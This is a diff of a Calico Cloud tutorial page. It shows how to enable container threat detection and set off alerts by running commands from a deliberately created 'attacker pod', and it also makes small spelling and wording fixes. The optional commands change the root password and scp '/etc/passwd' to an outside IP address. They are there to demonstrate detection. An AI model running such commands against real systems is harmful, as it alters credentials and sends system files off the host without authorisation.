@@ -2,17 +2,17 @@
 
 Calico Cloud provides a threat detection engine that analyzes observed file and process activity to detect known malicious and suspicious activity.
 
-Our threat detection engine also monitors activity within the containers running in your clusters to detect suspicious behavior and generate corresponding alerts. The threat detection engine monitors the following types of suspicious activity within containers:
+Our threat detection engine also monitors activity within the containers running in your clusters to detect suspicious behaviour and generate corresponding alerts. The threat detection engine monitors the following types of suspicious activity within containers:
 
 - Access to sensitive system files and directories
-- Defense evasion
+- Defence evasion
 - Discovery
 - Execution
 - Persistence
 - Privilege escalation
 
 1. Let's start by enabling the container threat detection feature.
-   For this, go to the `Threat Defence` option in the left-hand menu of Calico Cloud and select `Container Threat Detection`
+   For this, go to the `Threat Defense` option in the left-hand menu of Calico Cloud and select `Container Threat Detection`.
 
 2. If it is not enabled, you will see a page like this:
 
@@ -31,7 +31,7 @@ Our threat detection engine also monitors activity within the containers running
    kubectl -n tigera-runtime-security get daemonset.apps/runtime-reporter -o yaml | sed 's/15m/1m/g' | kubectl apply -f -
    ```
 
-3. Execute the following commands from the attacker pod (if you quitted from its shell, it got deleted. Just create it again, if it's the case.)
+3. Execute the following commands from the attacker pod (if you did quit from its shell, it got deleted. Create it again if it's the case.).
 
    ```bash
    apk update
@@ -44,7 +44,7 @@ Our threat detection engine also monitors activity within the containers running
    Optionally, you can also try the following;
    
    ```bash
-   passwd hacker
+   passwd root
    scp -o ConnectTimeout=3 /etc/passwd goomba@198.13.47.158:/tmp/
    ```
 
